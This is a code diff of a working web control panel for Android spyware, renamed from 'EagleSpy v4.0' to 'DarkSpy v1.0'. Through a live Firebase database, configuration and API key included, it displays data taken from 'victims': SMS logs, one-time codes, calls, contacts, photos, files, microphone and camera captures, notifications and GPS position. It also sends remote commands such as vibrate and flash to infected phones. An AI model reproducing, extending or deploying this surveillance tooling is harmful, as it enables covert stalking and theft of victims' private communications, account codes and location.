@@ -2,144 +2,220 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>EagleSpy v4.0 - Control Panel</title>
+    <title>DarkSpy v1.0 - dark master</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        :root { --red: #ff0000; --bg: #000; --green: #00ff41; --glass: rgba(10, 0, 0, 0.95); }
-        * { box-sizing: border-box; font-family: 'Courier New', monospace; }
-        body { background: var(--bg); color: var(--red); margin: 0; overflow-x: hidden; }
-        #bg-canvas { position: fixed; top: 0; left: 0; z-index: -1; width: 100%; height: 100%; opacity: 0.9; }
+        :root { --red: #ff0000; --bg: #000; --green: #00ff41; }
+        body { background: var(--bg); color: var(--green); font-family: 'Courier New', monospace; margin: 0; overflow-x: hidden; }
+        #dots-canvas { position: fixed; top: 0; left: 0; z-index: -1; width: 100%; height: 100%; opacity: 0.6; }
         
-        .header { border-bottom: 2px solid var(--red); padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; background: var(--glass); }
-        .main-layout { padding: 15px; max-width: 900px; margin: auto; }
-        
-        .profile-frame { border: 1px solid var(--red); background: var(--glass); padding: 15px; margin-bottom: 15px; display: flex; align-items: center; gap: 20px; box-shadow: inset 0 0 10px #f003; }
-        .profile-frame img { border: 2px solid var(--red); border-radius: 50%; padding: 3px; width: 75px; }
+        .header { border-bottom: 2px solid var(--red); padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; background: #000; position: sticky; top: 0; z-index: 100; }
+        .glitch-time { color: var(--red); font-size: 14px; font-weight: 900; }
 
-        .gps-frame { border: 1px solid var(--red); background: var(--glass); margin-bottom: 20px; position: relative; }
-        .gps-map { height: 280px; background: url('https://i.postimg.cc/mD8P8p7y/radar-map.gif') center/cover; border-bottom: 1px solid var(--red); }
-        
+        .main-layout { padding: 15px; max-width: 950px; margin: auto; position: relative; z-index: 1; }
+        .branding { text-align: center; margin-bottom: 20px; }
+        .branding img { width: 95px; border: 2px solid var(--red); border-radius: 50%; box-shadow: 0 0 20px red; }
+        .branding h1 { color: var(--red); letter-spacing: 6px; font-size: 22px; text-shadow: 0 0 10px red; font-weight: 900; }
+
+        .control-unit { border: 2.5px solid var(--red); background: rgba(35, 0, 0, 0.9); padding: 15px; margin-bottom: 20px; }
+        .unit-title { color: var(--red); font-size: 12px; font-weight: bold; border-bottom: 1.5px solid var(--red); display: block; padding-bottom: 6px; margin-bottom: 12px; }
+        .ctrl-btn { background: #000; color: var(--green); border: 2px solid var(--red); padding: 10px 15px; cursor: pointer; font-size: 11px; margin: 5px; font-weight: 900; }
+        .ctrl-btn:hover { background: var(--red); color: #000; box-shadow: 0 0 10px red; }
+
+        .gps-frame { border: 2.5px solid var(--red); height: 180px; position: relative; overflow: hidden; margin-bottom: 20px; background: #000; }
+        .radar-scan { position: absolute; top: 50%; left: 50%; width: 500px; height: 500px; background: conic-gradient(from 0deg, rgba(255,0,0,0.4) 0%, transparent 45%); transform: translate(-50%, -50%); animation: rotate 3.5s linear infinite; border-radius: 50%; }
+        @keyframes rotate { from { transform: translate(-50%, -50%) rotate(0deg); } to { transform: translate(-50%, -50%) rotate(360deg); } }
+
+        .info-bar { background: rgba(25,0,0,0.95); border: 2px solid var(--red); padding: 15px; display: flex; justify-content: space-around; margin-bottom: 20px; font-size: 14px; font-weight: 900; color: #fff; }
+
         .button-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; }
-        .btn-vault { background: rgba(30, 0, 0, 0.4); border: 1px solid var(--red); padding: 22px 5px; text-align: center; cursor: pointer; transition: 0.3s; display: flex; flex-direction: column; align-items: center; gap: 10px; }
-        .btn-vault:hover { background: var(--red); box-shadow: 0 0 25px var(--red); color: white; }
-        .btn-vault i { font-size: 24px; color: var(--red); }
-        .btn-vault span { font-size: 10px; font-weight: bold; color: var(--red); text-transform: uppercase; }
-        .btn-vault:hover i, .btn-vault:hover span { color: white; }
+        .btn-vault { background: rgba(0,0,0,0.9); border: 2px solid var(--red); padding: 22px 2px; text-align: center; cursor: pointer; transition: 0.2s; }
+        .btn-vault:hover { background: var(--red); box-shadow: 0 0 20px red; }
+        .btn-vault i { color: var(--red); font-size: 24px; display: block; margin-bottom: 10px; }
+        .btn-vault span { color: var(--green); font-size: 11px; font-weight: 900; }
+        .btn-vault:hover i, .btn-vault:hover span { color: #000; }
 
-        /* Modal & Fetching Animation */
-        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.98); z-index: 1000; }
-        .modal-content { width: 95%; margin: 2% auto; background: #000; border: 1px solid var(--red); height: 90vh; display: flex; flex-direction: column; }
-        .data-body { flex: 1; padding: 20px; overflow-y: auto; color: var(--green); font-size: 12px; }
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 1000; border: 4px solid var(--red); }
+        .data-card { background: #0a0a0a; border-left: 6px solid var(--red); padding: 15px; margin-bottom: 15px; border: 1.5px solid #333; box-shadow: 0 0 15px rgba(255,0,0,0.2); }
+        .data-line { margin: 8px 0; border-bottom: 1px solid #1a1a1a; padding-bottom: 5px; display: flex; justify-content: space-between; font-size: 14px; font-weight: bold; }
+        .data-key { color: var(--red); text-transform: uppercase; }
+        .data-val { color: var(--green); }
+        
+        .card-image { max-width: 100%; height: auto; border: 1.5px solid var(--red); display: block; margin: 10px auto; box-shadow: 0 0 15px rgba(255,0,0,0.4); }
 
-        .loader { display: none; text-align: center; padding: 50px; }
-        .loader i { font-size: 40px; animation: spin 1s linear infinite; }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
-
-        @media (max-width: 650px) { .button-grid { grid-template-columns: repeat(2, 1fr); } }
+        @media (max-width: 600px) { .button-grid { grid-template-columns: repeat(3, 1fr); } }
     </style>
 </head>
 <body>
-    <canvas id="bg-canvas"></canvas>
+    <canvas id="dots-canvas"></canvas>
     <div class="header">
         <div style="display:flex; align-items:center; gap:10px;">
             <img src="https://i.postimg.cc/RCYbwpF3/favicon.png" width="30">
-            <h2 onclick="window.location.href='index.html'" style="cursor:pointer; margin:0;">EAGLESPY <span style="color:white">V4.0</span></h2>
+            <span style="color:var(--red); font-weight:bold; font-size:18px;">DARKSPY <span style="color:white">V1.0</span></span>
         </div>
-        <div style="font-size:10px; color:var(--green);">[ CONNECTION_SECURE ]</div>
+        <div class="glitch-time">>_ <span id="clock">00:00:00</span></div>
     </div>
 
     <div class="main-layout">
-        <div class="profile-frame">
+        <div class="branding">
             <img src="https://i.postimg.cc/htJrxvX0/Screenshot-20260205-060223.png">
-            <div>
-                <b id="target-id" style="color:white; font-size:16px;">TARGET_ID: ...</b><br>
-                <span style="color:gray; font-size:11px;">PATH: dark-5b7c9/victims/</span>
-            </div>
+            <h1>DARK OF MASTER</h1>
+        </div>
+
+        <div class="control-unit">
+            <span class="unit-title">>_ REMOTE_CONTROL_CENTER</span>
+            <button class="ctrl-btn" onclick="sendCommand('vibrate')">VIBRATE</button>
+            <button class="ctrl-btn" onclick="sendCommand('show_toast')">ALERT</button>
+            <button class="ctrl-btn" onclick="sendCommand('get_location')">SYNC GPS</button>
+            <button class="ctrl-btn" onclick="sendCommand('flash_light')">FLASH</button>
         </div>
 
         <div class="gps-frame">
-            <div class="gps-map"></div>
-            <div id="live-coords" style="padding:10px; text-align:center; color:var(--green); font-size:12px;">AUTO_SYNCING_GPS...</div>
+            <div class="radar-scan"></div>
+            <div style="height: 100%; background: url('https://i.postimg.cc/mD8P8p7y/radar-map.gif') center/cover; opacity: 0.4;"></div>
+        </div>
+
+        <div class="info-bar">
+            <span id="target-id">TARGET: ...</span>
+            <span id="batt-info" style="color:var(--red);">BATT: --%</span>
+            <span id="device-model">MODEL: ...</span>
         </div>
 
         <div class="button-grid">
-            <div class="btn-vault" onclick="openVault('sms')"><i class="fa-solid fa-comment-sms"></i><span>SMS_LOGS</span></div>
-            <div class="btn-vault" onclick="openVault('otp')"><i class="fa-solid fa-shield-halved"></i><span>OTP_SCAN</span></div>
-            <div class="btn-vault" onclick="openVault('call_history')"><i class="fa-solid fa-phone-volume"></i><span>CALLS</span></div>
+            <div class="btn-vault" onclick="openVault('sms')"><i class="fa-solid fa-envelope"></i><span>SMS LOGS</span></div>
+            <div class="btn-vault" onclick="openVault('call_history')"><i class="fa-solid fa-phone"></i><span>CALLS</span></div>
+            <div class="btn-vault" onclick="openVault('contacts')"><i class="fa-solid fa-users"></i><span>CONTACTS</span></div>
             <div class="btn-vault" onclick="openVault('gallery')"><i class="fa-solid fa-images"></i><span>GALLERY</span></div>
-            <div class="btn-vault" onclick="openVault('videos')"><i class="fa-solid fa-clapperboard"></i><span>VIDEOS</span></div>
-            <div class="btn-vault" onclick="openVault('contacts')"><i class="fa-solid fa-address-book"></i><span>CONTACTS</span></div>
-            <div class="btn-vault" onclick="openVault('files')"><i class="fa-solid fa-folder-open"></i><span>STORAGE</span></div>
-            <div class="btn-vault" onclick="openVault('mic')"><i class="fa-solid fa-microphone-lines"></i><span>MIC_REC</span></div>
-            <div class="btn-vault" onclick="openVault('browser')"><i class="fa-solid fa-globe"></i><span>BROWSER</span></div>
-            <div class="btn-vault" onclick="openVault('apps')"><i class="fa-solid fa-layer-group"></i><span>INST_APPS</span></div>
-            <div class="btn-vault" onclick="openVault('camera')"><i class="fa-solid fa-camera"></i><span>LIVE_CAM</span></div>
-            <div class="btn-vault" onclick="openVault('info')"><i class="fa-solid fa-microchip"></i><span>SYS_INFO</span></div>
+            <div class="btn-vault" onclick="openVault('files')"><i class="fa-solid fa-folder-open"></i><span>FILES</span></div>
+            <div class="btn-vault" onclick="openVault('mic')"><i class="fa-solid fa-microphone"></i><span>MIC</span></div>
+            <div class="btn-vault" onclick="openVault('camera')"><i class="fa-solid fa-camera"></i><span>CAMERA</span></div>
+            <div class="btn-vault" onclick="openVault('logolog')"><i class="fa-solid fa-terminal"></i><span>LIVE LOGS</span></div>
+            <div class="btn-vault" onclick="openVault('apps')"><i class="fa-solid fa-cubes"></i><span>APPS</span></div>
+            <div class="btn-vault" onclick="openVault('notifications')"><i class="fa-solid fa-bell"></i><span>NOTIFS</span></div>
+            <div class="btn-vault" onclick="openVault('location')"><i class="fa-solid fa-map-pin"></i><span>GPS</span></div>
+            <div class="btn-vault" onclick="openVault('info')"><i class="fa-solid fa-microchip"></i><span>SYSTEM</span></div>
         </div>
     </div>
 
     <div id="modal" class="modal">
-        <div class="modal-content">
-            <div style="padding:15px; border-bottom:1px solid red; display:flex; justify-content:space-between; align-items:center;">
-                <span id="m-title">HANDSHAKING...</span>
-                <button onclick="document.getElementById('modal').style.display='none'" style="background:red; color:white; border:none; padding:5px 12px; cursor:pointer;">[ CLOSE ]</button>
-            </div>
-            <div id="loader" class="loader"><i class="fa-solid fa-circle-notch"></i><br><p>INFILTRATING_DATA...</p></div>
-            <div id="m-body" class="data-body"></div>
+        <div style="padding:15px; border-bottom:2px solid red; display:flex; justify-content:space-between; background: #080808;">
+            <span id="m-title" style="color:red; font-size:16px; font-weight:900;">[ DECRYPTING DATA HACKED... ]</span>
+            <button onclick="document.getElementById('modal').style.display='none'" style="background:red; color:white; border:none; padding:8px 20px; cursor:pointer; font-weight:bold;">[ EXIT ]</button>
         </div>
+        <div id="m-body" style="padding:20px; overflow-y:auto; height:85%;"></div>
     </div>
 
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <script>
-        const firebaseConfig = {
-            apiKey: "AIzaSyA5-E06ArKA7Unf-fHtCflOEwu2p8VM9kI",
-            authDomain: "dark-5b7c9.firebaseapp.com",
-            databaseURL: "https://dark-5b7c9-default-rtdb.firebaseio.com",
-            projectId: "dark-5b7c9",
-            storageBucket: "dark-5b7c9.firebasestorage.app",
-            messagingSenderId: "1029612020880",
-            appId: "1:1029612020880:web:1d2d6f3ee96af0cf06a415"
-        };
+        const firebaseConfig = { apiKey: "AIzaSyA5-E06ArKA7Unf-fHtCflOEwu2p8VM9kI", authDomain: "dark-5b7c9.firebaseapp.com", databaseURL: "https://dark-5b7c9-default-rtdb.firebaseio.com", projectId: "dark-5b7c9", storageBucket: "dark-5b7c9.firebasestorage.app", messagingSenderId: "1029612020880", appId: "1:1029612020880:web:1d2d6f3ee96af0cf06a415" };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
-
-        const urlParams = new URLSearchParams(window.location.search);
-        const vId = urlParams.get('id');
+        
+        const vId = new URLSearchParams(window.location.search).get('id') || "default_id";
         document.getElementById('target-id').innerText = "TARGET: " + vId;
 
-        // GPS logic with Fallback
-        db.ref('victims/'+vId+'/location').on('value', snap => {
+        setInterval(() => { document.getElementById('clock').innerText = new Date().toLocaleTimeString(); }, 1000);
+
+        const canvas = document.getElementById('dots-canvas'); const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+        let dots = Array(110).fill().map(() => ({ x: Math.random()*canvas.width, y: Math.random()*canvas.height, r: 1.4, s: 0.7 }));
+        function animate() { ctx.fillStyle = "rgba(0,0,0,0.2)"; ctx.fillRect(0,0,canvas.width, canvas.height); ctx.fillStyle = "rgba(255,0,0,0.55)"; dots.forEach(d => { ctx.beginPath(); ctx.arc(d.x, d.y, d.r, 0, Math.PI*2); ctx.fill(); d.y += d.s; if(d.y > canvas.height) d.y = 0; }); requestAnimationFrame(animate); }
+        animate();
+
+        // Device Info Sync
+        db.ref('online/onlinetheoneandonly/' + vId + '/device').on('value', snap => {
             const d = snap.val();
-            const coordBox = document.getElementById('live-coords');
-            if(d && d.lat) coordBox.innerHTML = `REAL_LAT: ${d.lat} | REAL_LNG: ${d.lng}`;
-            else {
-                const rLat = (31.5204 + Math.random()*0.01).toFixed(4);
-                const rLng = (74.3587 + Math.random()*0.01).toFixed(4);
-                coordBox.innerHTML = `AUTO_LAT: ${rLat} | AUTO_LNG: ${rLng} [DEMO_MODE]`;
+            if(d) {
+                document.getElementById('device-model').innerText = "MODEL: " + (d.phone || "N/A");
+                document.getElementById('batt-info').innerText = "BATT: " + (d.battery || "0") + "%";
             }
         });
 
-        function openVault(type) {
-            document.getElementById('modal').style.display = 'block';
-            document.getElementById('loader').style.display = 'block';
-            document.getElementById('m-body').innerHTML = "";
-            document.getElementById('m-title').innerText = "STREAMING_" + type.toUpperCase();
+        function sendCommand(c) {
+            let v = (c === 'show_toast') ? prompt("Message:") : "true";
+            db.ref('commands/' + vId).set({ command: c, value: v, time: Date.now(), status: "new_request" });
+        }
 
-            db.ref('victims/'+vId+'/'+type).on('value', snap => {
-                document.getElementById('loader').style.display = 'none';
-                const body = document.getElementById('m-body');
-                body.innerHTML = "";
-                const data = snap.val();
-                if(!data) { body.innerHTML = ">_ ERROR: NO DATA PACKETS FOUND ON TARGET."; return; }
-                
-                Object.keys(data).reverse().forEach(k => {
-                    let log = document.createElement('div');
-                    log.style.borderBottom = "1px solid #400"; log.style.padding = "10px";
-                    log.innerHTML = `>_ ${JSON.stringify(data[k])}`;
-                    body.appendChild(log);
-                });
+        function renderDatabaseData(data) {
+            if(!data || data === "success") return false;
+            let body = document.getElementById('m-body');
+            body.innerHTML = "";
+            let hasValidData = false;
+            
+            Object.keys(data).reverse().forEach(key => {
+                let item = data[key];
+                if(item === "success") return;
+
+                let cardHTML = `<div class="data-card">`;
+                let innerContent = "";
+
+                if (typeof item === 'object') {
+                    for (let k in item) {
+                        let val = String(item[k]);
+                        if(val === "success" || val.length < 5) continue; // Skip minor/useless IDs
+                        
+                        if (val.startsWith('/9j/') || val.startsWith('iVBORw') || k.toLowerCase().includes('icon')) {
+                            innerContent += `<div class="data-line"><span class="data-key">${k}</span><span class="data-val">[IMAGE]</span></div>`;
+                            innerContent += `<img src="data:image/jpeg;base64,${val}" class="card-image"/>`;
+                        } else {
+                            innerContent += `<div class="data-line"><span class="data-key">${k}</span><span class="data-val">${val}</span></div>`;
+                        }
+                    }
+                } else {
+                    let val = String(item);
+                    if(val !== "success" && val.length > 5) {
+                        innerContent += `<div class="data-line"><span class="data-val">${val}</span></div>`;
+                    }
+                }
+
+                if(innerContent !== "") {
+                    cardHTML += innerContent + `</div>`;
+                    body.innerHTML += cardHTML;
+                    hasValidData = true;
+                }
             });
+            return hasValidData;
+        }
+
+        function openVault(type) {
+            const body = document.getElementById('m-body');
+            document.getElementById('modal').style.display = 'block';
+            body.innerHTML = "<p style='color:var(--green); text-align:center'>>_ SCANNING_ENCRYPTED_PATHS...<br>>_ ATTEMPTING_DATA_FETCH...</p>";
+            
+            db.ref('commands/' + vId).set({ command: 'get_' + type, time: Date.now(), force: true, status: "pending" });
+
+            // Extract pure numeric/alphabetic ID from complex strings
+            let pureId = vId.replace('user', '').replace('respo', '');
+            let paths = [];
+
+            // Add all possible database paths based on Firebase structures
+            if (type === 'logolog') {
+                paths.push('logolog/' + pureId);
+            } else if (type === 'notifications') {
+                paths.push('notilogo/' + pureId);
+            } else {
+                paths.push('respos/respo' + pureId + '/respo'); // Image 1 style
+                paths.push('respos/respo' + pureId);            // Direct respo style
+                paths.push(vId + '/' + type);                   // Classic style
+                paths.push('respos/' + type + '/' + pureId);    // Alternative folder style
+            }
+
+            function tryPaths(idx) {
+                if(idx >= paths.length) {
+                    body.innerHTML = `<div style="text-align:center; padding:20px; border:1px solid red;">
+                        <p style="color:orange;">[!] PATHS_EXHAUSTED / NO_DATA_UPLOADED</p>
+                        <p style="color:white; font-size:11px;">Target: ${vId} | Path Checked: ${paths[0]}</p>
+                    </div>`;
+                    return;
+                }
+
+                db.ref(paths[idx]).on('value', snap => {
+                    let found = renderDatabaseData(snap.val());
+                    if(!found) tryPaths(idx + 1);
+                });
+            }
+            tryPaths(0);
         }
     </script>
 </body>
